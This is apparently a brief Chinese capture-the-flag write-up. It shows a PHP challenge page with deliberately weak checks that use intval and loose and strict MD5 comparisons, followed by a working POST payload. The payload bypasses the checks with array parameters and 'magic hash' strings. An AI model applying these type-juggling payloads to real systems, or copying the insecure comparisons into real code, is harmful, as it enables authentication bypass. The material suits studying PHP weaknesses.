#PHP  #MD5
```php
 <?php
highlight_file(__FILE__);
include_once('flag.php');
if(isset($_POST['a'])&&!preg_match('/[0-9]/',$_POST['a'])&&intval($_POST['a'])){
    if(isset($_POST['b1'])&&$_POST['b2']){
        if($_POST['b1']!=$_POST['b2']&&md5($_POST['b1'])===md5($_POST['b2'])){
            if($_POST['c1']!=$_POST['c2']&&is_string($_POST['c1'])&&is_string($_POST['c2'])&&md5($_POST['c1'])==md5($_POST['c2'])){
                echo $flag;
            }else{
                echo "yee";
            }
        }else{
            echo "nop";
        }
    }else{
        echo "go on";
    }
}else{
    echo "let's get some php";
}
?>
```
**intval()** 函数用于获取变量的整数值。
payload:
```url
a[]=1&b1[]=1&b2[]=2&c1=s878926199a&c2=s214587387a
```
`a` 绕过数字
`b` 绕过MD5
`c` 绕过MD5+限定类型字符串